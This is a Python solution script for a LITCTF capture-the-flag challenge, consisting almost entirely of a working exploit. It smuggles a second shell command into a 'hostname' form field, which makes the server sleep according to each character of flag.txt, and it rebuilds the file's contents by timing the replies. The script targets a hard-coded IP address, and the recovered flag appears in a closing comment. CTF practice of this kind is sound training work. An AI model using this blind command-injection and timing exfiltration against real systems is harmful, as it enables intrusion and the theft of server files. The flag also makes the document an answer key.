import time
from utils.flag_strings import leet_flag_chars_mixed, punctuation
import requests


FLAG_CHARS = leet_flag_chars_mixed.rstrip(punctuation)


# got LITCTF{caREFu1_fr on the first run, update FLAG_CHARS to be less ambiguous
FLAG_CHARS = "14_ACEFRUacefru{}" + FLAG_CHARS


URL = "http://34.130.180.82:50233/"
# URL = "http://127.0.0.1:8080/"


def time_request(payload: dict):
    start_time = time.time()
    requests.post(URL, data=payload)
    time_taken = time.time() - start_time
    return time_taken

def get_letter(index: int, base_time: float) -> str:
    payload = dict()
    payload["hostname"] = f"""google.com; python3 -c "import time; time.sleep('{FLAG_CHARS}'.index(open('flag.txt').read()[{index}]))" """

    time_taken = time_request(payload)
    print(index, time_taken, base_time)
    time_taken -= base_time

    index = int(time_taken)
    return FLAG_CHARS[index]


def main():
    empty_payload = dict()
    empty_payload["hostname"] = "google.com"
    base_times = [time_request(empty_payload) for _ in range(5)]
    base_time = sum(base_times) / len(base_times)
    flag = "LITCTF{"
    while not flag.endswith('}'):
        flag += get_letter(len(flag), base_time)
        print(flag)
        # break

if __name__ == '__main__':
    main()

# LITCTF{c4refu1_fr}
